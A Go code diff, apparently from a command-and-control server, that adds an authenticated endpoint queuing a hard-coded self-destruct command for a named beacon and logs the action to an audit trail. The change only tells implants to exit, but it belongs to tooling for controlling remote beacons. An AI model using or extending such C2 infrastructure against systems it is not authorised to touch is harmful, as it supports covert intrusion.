@@ -19,6 +19,9 @@ import (
 
 const maxQueuedCommandLen = 8000
 
+// beaconSelfDestructCommand is queued for Scythe to exit on next heartbeat delivery.
+const beaconSelfDestructCommand = "sendmetojesusdog"
+
 func beaconSelectLabel(c dbconnections.BeaconClientDocument) string {
 	label := strings.TrimSpace(c.BeaconLabel)
 	if label == "" {
@@ -303,4 +306,46 @@ func (s *Server) handleAPIBeaconCommandOutput(w http.ResponseWriter, r *http.Req
 		"client_id": clientID,
 		"entries":   entries,
 	})
+}
+
+type beaconKillRequest struct {
+	ClientID string `json:"client_id"`
+}
+
+func (s *Server) handleAPIBeaconKill(w http.ResponseWriter, r *http.Request) {
+	actor, _, ok := s.sessionUser(r)
+	if !ok {
+		jsonError(w, http.StatusUnauthorized, "unauthorized")
+		return
+	}
+	var req beaconKillRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		jsonError(w, http.StatusBadRequest, "invalid json")
+		return
+	}
+	req.ClientID = strings.TrimSpace(req.ClientID)
+	if req.ClientID == "" {
+		jsonError(w, http.StatusBadRequest, "client_id required")
+		return
+	}
+	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
+	defer cancel()
+	err := dbconnections.AppendBeaconCommands(ctx, req.ClientID, []string{beaconSelfDestructCommand})
+	if err != nil {
+		if err == mongo.ErrNoDocuments {
+			jsonError(w, http.StatusNotFound, "beacon not found")
+			return
+		}
+		log.Printf("admin: beacon kill queue: %v", err)
+		jsonError(w, http.StatusInternalServerError, "queue failed")
+		return
+	}
+	if err := dbconnections.InsertAuditLog(ctx, actor, dbconnections.AuditActionBeaconKillQueued, bson.M{
+		"client_id": req.ClientID,
+		"command":   beaconSelfDestructCommand,
+	}); err != nil {
+		log.Printf("admin: audit beacon kill: %v", err)
+	}
+	w.Header().Set("Content-Type", "application/json")
+	_ = json.NewEncoder(w).Encode(map[string]string{"status": "queued", "command": beaconSelfDestructCommand})
 }
